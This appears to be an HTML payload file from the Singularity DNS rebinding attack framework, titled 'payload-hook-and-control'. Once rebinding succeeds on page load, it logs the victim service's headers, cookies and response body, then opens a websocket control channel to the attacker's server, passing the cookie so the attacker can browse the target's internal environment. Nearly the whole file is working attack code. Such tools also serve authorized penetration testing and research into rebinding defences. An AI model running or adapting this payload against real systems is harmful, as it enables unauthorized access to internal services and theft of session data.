<!--
This payload requests the target to establish a websocket control channel to Singularity server.
It then waits for commands from Singularity. Permits attackers to browse the target as if they 
were working from the target environment.
-->
<!doctype html>
<html>

<head>
	<title>payload-hook-and-control</title>
	<script src="payload.js"></script>
	<script>
		// attack() is called once DNS rebinding is successful
		// headers and body contains server data obtained 
		// from the victim service during rebinding, if any.
		function attack(headers, cookie, body) {
			if (headers !== null) { 
			console.log(`Origin: ${window.location} headers: ${httpHeaderstoText(headers)}`);
			};
			if (cookie !== null) { 
			console.log(`Origin: ${window.location} headers: ${cookie}`);
			};
			if (body !== null) {
			console.log(`Origin: ${window.location} body:\n${body}`);
			};

			// establish ws connection to Singularity server
			webSocketHook(cookie);
		}
	</script>
</head>

<body onload="begin('/')")>
	<h3>Hook and Control Payload</h3>
	<p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
</body></html>
